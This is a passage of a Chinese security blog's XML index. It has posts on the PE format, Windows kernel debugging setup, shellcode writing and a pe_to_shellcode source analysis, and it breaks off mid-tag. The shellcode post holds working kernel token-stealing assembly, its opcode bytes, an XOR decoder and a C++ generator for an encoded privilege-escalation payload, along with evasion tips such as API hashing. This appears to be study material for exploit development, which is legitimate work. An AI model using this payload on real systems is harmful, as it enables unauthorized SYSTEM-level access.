      <url>/2022/10/24/pe-wen-jian-ge-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1.overview"></a>1.overview</h2><p><img src="/2022/10/24/pe-wen-jian-ge-shi/pe3.png" alt="整体结构"></p><h2 id="2-headers-offset"><a href="#2-headers-offset" class="headerlink" title="2.headers_offset"></a>2.headers_offset</h2><p><img src="/2022/10/24/pe-wen-jian-ge-shi/pe1.png" alt="header_offset"></p><h2 id="3-tables-offset"><a href="#3-tables-offset" class="headerlink" title="3.tables_offset"></a>3.tables_offset</h2><p><img src="/2022/10/24/pe-wen-jian-ge-shi/pe2.JPG" alt="table_offset"></p><h2 id="4-others"><a href="#4-others" class="headerlink" title="4.others"></a>4.others</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs url">// 偏移<br>sunshine2k.de<br>// 资源表<br>https://blog.csdn.net/panjunnn/article/details/115458877<br>// TLS<br>https://lzeroyuee.cn/old-blog/TLS回调 - lZeroyuee&#x27;s Blog.html<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> windows </tag>
            
            <tag> pe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10内核环境配置</title>
      <link href="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/"/>
      <url>/2022/10/23/win10-nei-he-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-双机调试"><a href="#1-双机调试" class="headerlink" title="1.双机调试"></a>1.双机调试</h2><h3 id="1-1-虚拟机中执行命令"><a href="#1-1-虚拟机中执行命令" class="headerlink" title="1.1 虚拟机中执行命令"></a>1.1 虚拟机中执行命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">管理员身份--powershell</span><br>bcdedit  /set  “&#123;current&#125;”  bootmenupolicy  Legacy<br>bcdedit  /dbgsettings  SERIAL  DEBUGPORT:1  BAUDRATE:115200<br>bcdedit  /copy  “&#123;current&#125;”   /d  “Debug”<br>bcdedit  /debug  “&#123;&lt;新建的启动配置的标识符&gt;&#125;”   on<br></code></pre></td></tr></table></figure><h3 id="1-2-VMVare设置"><a href="#1-2-VMVare设置" class="headerlink" title="1.2 VMVare设置"></a>1.2 VMVare设置</h3><p>添加串行端口，配置如下：</p><p><img src="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/image-20221023174153708.png" alt="VMVare设置"></p><h3 id="1-3-Windbg设置"><a href="#1-3-Windbg设置" class="headerlink" title="1.3 Windbg设置"></a>1.3 Windbg设置</h3><p><img src="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/image-20221023174338400.png" alt="Windbg设置"></p><h2 id="2-驱动框架"><a href="#2-驱动框架" class="headerlink" title="2.驱动框架"></a>2.驱动框架</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Empty WDM Driver</span><br><span class="hljs-comment">// 关闭警告视为错误</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntifs.h&gt;</span></span><br><br>VOID <span class="hljs-title function_">DriverUnloadProc</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject)</span><br>&#123;<br>DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Driver unload.\r\n&quot;</span>);<br>&#125;<br><br>NTSTATUS <span class="hljs-title function_">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span><br>&#123;<br>pDriver-&gt;DriverUnload = DriverUnloadProc;<br>DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Driver load.\r\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-x64内联汇编"><a href="#3-x64内联汇编" class="headerlink" title="3.x64内联汇编"></a>3.x64内联汇编</h2><p>源文件中添加.asm文件</p><p><img src="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/image-20220819101126465.png" alt="添加.asm文件"></p><p>右键汇编文件，如下设置</p><p><img src="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/image-20220819101145950.png" alt="右键汇编文件"></p><p>应用后设置自定义生成工具选项</p><p><img src="/2022/10/23/win10-nei-he-huan-jing-pei-zhi/image-20220819101234574.png" alt="General"></p><p>配置如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ml64 /c %(filename).asm<br><span class="hljs-meta prompt_">%</span><span class="language-bash">(filename).obj;%(Outputs)</span><br></code></pre></td></tr></table></figure><p><strong>函数框架</strong></p><p>tools.asm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 读取MSR寄存器<br>.code<br><br>ReadMsr proc<br>    ; rcx msr地址  rdx 接收的地址<br>    push rdi<br>    push rax<br>    mov  rdi,rdx<br>    xor  rax,rax<br>    xor  rdx,rdx<br>    rdmsr<br>    mov  [rdi],eax<br>    mov  [rdi+4],edx<br>    pop  rax<br>    pop  rdi<br>    ret<br>ReadMsr endp<br><br>end<br></code></pre></td></tr></table></figure><p>main.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;c&quot;</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ReadMsr</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>, <span class="hljs-type">void</span> *)</span>;<br></code></pre></td></tr></table></figure><p><strong>VS2015汇编高亮插件</strong></p><p>插件地址：<a href="https://github.com/HJLebbink/asm-dude/releases">https://github.com/HJLebbink/asm-dude/releases</a></p><p>找到Common7\IDE\VSIXInstaller.exe运行，并将要安装的插件拖入即可。</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShellCode编程</title>
      <link href="/2022/10/22/shellcode-bian-cheng/"/>
      <url>/2022/10/22/shellcode-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="1-BypassUAC"><a href="#1-BypassUAC" class="headerlink" title="1.BypassUAC"></a>1.BypassUAC</h2><h3 id="1-1-伪造Token"><a href="#1-1-伪造Token" class="headerlink" title="1.1 伪造Token"></a>1.1 伪造Token</h3><p><strong>原理：</strong>将待提权进程替换为System进程EPROCESS结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rcx, 0x1234; Pid<br>push rbx<br>xor rbx, rbx<br>mov rdx, qword ptr gs:[188h]; CurrentThread<br>mov rdx, qword ptr [rdx+220h]; EProcess head<br>mov rax, rdx<br>mov r8, qword ptr [rdx+440h]<br>cmp r8, 4<br>jnz loop_begin<br>mov rbx, rdx<br>loop_begin:<br>mov rdx, qword ptr [rdx+448h]; Next EProcess<br>sub rdx, 448h<br>cmp rdx, rax<br>jz ret<br>mov r8, qword ptr [rdx+440h]<br>cmp r8, rcx ; cmp goal pid<br>jnz loop_begin<br>mov r9, rdx<br><br>cmp rbx, 0<br>jnz replace<br>cmp r8, 4; cmp System pid<br>jnz loop_begin<br>mov rbx, rdx<br><br>replace:<br>mov rbx, qword ptr [rbx+4b8h]<br>mov qword ptr [r9+4b8h], rbx; replace<br>ret:<br>pop rbx<br></code></pre></td></tr></table></figure><h3 id="1-2-修改ACL"><a href="#1-2-修改ACL" class="headerlink" title="1.2 修改ACL"></a>1.2 修改ACL</h3><p>Win10最新版已不能用</p><h3 id="1-3-强制开启权限"><a href="#1-3-强制开启权限" class="headerlink" title="1.3 强制开启权限"></a>1.3 强制开启权限</h3><p>Win10最新版已不能用</p><h2 id="2-编程技巧"><a href="#2-编程技巧" class="headerlink" title="2.编程技巧"></a>2.编程技巧</h2><h3 id="2-1-去除空字节"><a href="#2-1-去除空字节" class="headerlink" title="2.1 去除空字节"></a>2.1 去除空字节</h3><h4 id="2-1-1-指令替换"><a href="#2-1-1-指令替换" class="headerlink" title="2.1.1 指令替换"></a>2.1.1 指令替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">原始指令<br>B8 00 00 00 00mov eax, 0<br>替换指令<br>33 C0xor eax, eax<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">原始指令<br>64:A1 30000000mov eax, fs:[0x30]<br>替换指令<br>33 D8xor ebx, ebx<br>64:8B43 30mov eax, fs:[ebx+0x30]<br></code></pre></td></tr></table></figure><h4 id="2-1-2-栈转换"><a href="#2-1-2-栈转换" class="headerlink" title="2.1.2 栈转换"></a>2.1.2 栈转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">原始指令<br>8178 04 56341200cmp dword ptr ds:[eax+4], 123456<br>替换指令<br>33 FF xor edi, edi<br>57 push edi<br>6A 12 push 0x12<br>68 56 34 00 00 push 0x3456<br>8B 3C 24 mov edi, dword ptr ss:[esp]<br>83 C4 0A add esp, 0xA<br>39 78 04cmp dword ptr ds:[eax+4], edi<br></code></pre></td></tr></table></figure><h4 id="2-1-3-编码解码"><a href="#2-1-3-编码解码" class="headerlink" title="2.1.3 编码解码"></a>2.1.3 编码解码</h4><p>函数式解码器，参数1为shellcode长度，解压加载器尾部的shellcode并跳转过去执行，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; rcx size_of_shellcode<br>decoder proc<br><br>jmp start<br>decode:<br>pop rax<br>add rax, 1<br>loop_begin:<br>xor byte ptr [rax], Fh<br>inc rax<br>loop loop_begin<br>sub rax, rcx<br>jmp rax<br>start:<br>call decode<br>ret<br><br>decoder endp<br><br>end<br></code></pre></td></tr></table></figure><p>编写一个内核提权ShellCode生成器，代码如下：<strong>（用于异或的字符不能与ShellCode原始字符重复，否则会出现NULL）</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br>&#123;<br><span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x33</span>,<br><span class="hljs-number">0xDB</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC2</span>,<br><span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF8</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x48</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x48</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCA</span>,<br><span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x75</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x5B</span><br>&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> loader[] =<br>&#123;<br><span class="hljs-number">0xEB</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0F</span>,<br><span class="hljs-number">0x48</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>,<br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC3</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gen_shellcode</span><span class="hljs-params">(<span class="hljs-type">int</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-type">int</span> loader_size = <span class="hljs-built_in">sizeof</span>(loader);<br><span class="hljs-type">int</span> shellcode_size = <span class="hljs-built_in">sizeof</span>(shellcode);<br><br>*(<span class="hljs-type">int</span>*)&amp;shellcode[<span class="hljs-number">3</span>] = pid;<br><br><span class="hljs-type">char</span>* ptr_out = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(loader_size + shellcode_size);<br><span class="hljs-built_in">memcpy</span>(ptr_out, loader, loader_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++)<br>&#123;<br>ptr_out[loader_size + i] = shellcode[i] ^ <span class="hljs-number">0xf</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; loader_size + shellcode_size; i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x, &quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ptr_out[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">if</span> (ptr_out)<br>&#123;<br><span class="hljs-built_in">free</span>(ptr_out);<br>ptr_out = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Process pid: &quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;pid);<br><br><span class="hljs-built_in">gen_shellcode</span>(pid);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-Shellcode定位"><a href="#2-2-Shellcode定位" class="headerlink" title="2.2 Shellcode定位"></a>2.2 Shellcode定位</h3><p><strong>ShellCode中获取指令地址：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp get_entry<br>entry:<br>pop rax<br>; 此时rax保存shellcode地址<br>get_entry:<br>call entry<br>shellcode:<br>; code<br></code></pre></td></tr></table></figure><p><strong>栈溢出攻击时利用跳板定位ShellCode起始位置：</strong></p><p><img src="/2022/10/22/shellcode-bian-cheng/image-20221023154735938.png" alt="定位ShellCode起始位置"></p><p><strong>抬高栈顶保护shellcode，避免压栈破环自身：</strong></p><p><img src="/2022/10/22/shellcode-bian-cheng/image-20221023155224287.png" alt="抬高栈顶保护shellcode"></p><h3 id="2-3-获取Windows-API"><a href="#2-3-获取Windows-API" class="headerlink" title="2.3 获取Windows API"></a>2.3 获取Windows API</h3><p>可以使用HASH来避免出现函数名</p><p><strong>解析流程图：</strong></p><p><img src="/2022/10/22/shellcode-bian-cheng/image-20221023155636629.png" alt="解析模块链表示意图"></p><h3 id="2-4-ShellCode瘦身"><a href="#2-4-ShellCode瘦身" class="headerlink" title="2.4 ShellCode瘦身"></a>2.4 ShellCode瘦身</h3><ul><li><p>使用短、复合指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xchg eax,reg 交换 eax 和其他寄存器中的值<br>lodsd 把 esi 指向的一个 dword 装入 eax，并且增加 esi<br>lodsb 把 esi 指向的一个 byte 装入 al，并且增加 esi<br>stosd<br>stosb<br>pushad/popad 从栈中存储/恢复所有寄存器的值<br>cdq 用 edx 把 eax 扩展成四字。这条指令在 eax&lt;0x80000000 时可用作 mov edx ,NULL<br></code></pre></td></tr></table></figure></li><li><p>栈首初始化大块0区域，避免频繁使用清0指令</p></li><li><p>使用栈中的垃圾数据</p></li><li><p>使用ebp</p></li><li><p>ShellCode代码当作数据来用</p></li><li><p>hash函数名对比，并根据需求选择合适的hash长度，可以容忍碰撞</p></li></ul><h3 id="2-5-VS开发ShellCode"><a href="#2-5-VS开发ShellCode" class="headerlink" title="2.5 VS开发ShellCode"></a>2.5 VS开发ShellCode</h3><p><a href="https://paper.seebug.org/papers/Archive/drops2/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80%26shellcode.html">Exploit开发系列教程-Windows基础&amp;shellcode - P3nro5e (seebug.org)</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pe_to_shellcode源码分析</title>
      <link href="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/"/>
      <url>/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-编译"><a href="#1-编译" class="headerlink" title="1.编译"></a>1.编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">// 递归clone<br>git clone --recursive https://github.com/hasherezade/pe_to_shellcode.git<br>cd pe_to_shellcode<br>cmake .<br>// VisualStudio打开sln编译即可<br></code></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021171412499.png" alt="编译示意图"></p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h2><ul><li>dos-&gt;e_lfanew 长度不能大于1024</li><li>Optional-&gt;Magic 可以判断32位数</li><li>Optional-&gt;Subsystem 可以判断窗口或控制台</li><li>必须要有重定位表、不支持.NET程序</li><li>加载资源：64位的资源id为102，32位的资源id为101</li></ul><h3 id="2-1-Packer"><a href="#2-1-Packer" class="headerlink" title="2.1 Packer"></a>2.1 Packer</h3><h4 id="2-1-1-映射PE"><a href="#2-1-1-映射PE" class="headerlink" title="2.1.1 映射PE"></a>2.1.1 映射PE</h4><p>将PE文件从文件状态转换到内存状态，关键代码如下：<br><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021225242565.png" alt="PE映射"></p><h4 id="2-1-2-拼接Loader"><a href="#2-1-2-拼接Loader" class="headerlink" title="2.1.2 拼接Loader"></a>2.1.2 拼接Loader</h4><p>从资源节中读取Loader数据（32位id为101、64位id为102），将Loader拼接到PE文件的末尾，关键代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021225615581.png" alt="PE末尾拼接Loader"></p><p>将启动Loder的ShellCode填入DOS垃圾区域，关键代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021225846121.png" alt="填入DOS垃圾区域"></p><h4 id="2-1-3-修复节表"><a href="#2-1-3-修复节表" class="headerlink" title="2.1.3 修复节表"></a>2.1.3 修复节表</h4><p>为了避免作为ShellCode执行时需要拉伸PE，直接将节表的文件偏移及大小修复为内存偏移及大小，关键代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021230422053.png" alt="修复节表"></p><p>如果是64位.NET程序，需要将OEP修改为0，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021230714771.png" alt="64位.NET修复OEP"></p><p>如果是32位.NET程序，需要找到_CorExeMain函数，并寻找间接跳转指令，将OEP修改为间接跳转指令位置，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021230954495.png" alt="32位.NET修复OEP"></p><h3 id="2-2-RunShellCode"><a href="#2-2-RunShellCode" class="headerlink" title="2.2 RunShellCode"></a>2.2 RunShellCode</h3><h4 id="2-2-1-Loader启动"><a href="#2-2-1-Loader启动" class="headerlink" title="2.2.1 Loader启动"></a>2.2.1 Loader启动</h4><p>很巧妙，充分利用PE头部，将4D5A用作指令，并将垃圾区域作为Loader启动器，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021231450435.png" alt="Loader启动器"></p><p>上述代码解释：</p><ul><li><p>使用call pop获取当前指令地址，减去固定偏移即可得到ImageBase</p></li><li><p>根据Packer填入的原始SizeOfImage加上ImageBase得到Packer地址</p></li><li><p>call Loader代码，ImageBase作为参数</p></li></ul><h4 id="2-2-2-Loader"><a href="#2-2-2-Loader" class="headerlink" title="2.2.2 Loader"></a>2.2.2 Loader</h4><p>Loader原理为常规的PE Loader，主要包括修复重定位表、动态解析API修复IAT表、执行TLS回调，执行入口点。</p><h5 id="2-2-2-1-获取必要API"><a href="#2-2-2-1-获取必要API" class="headerlink" title="2.2.2.1 获取必要API"></a>2.2.2.1 获取必要API</h5><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232341973.png" alt="获取必要API"></p><p>ShellCode基本手段，解析PEB-&gt;Ldr，从模块链表中获取模块基址，再比对hash，解析导出表，获取函数地址，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232407009.png" 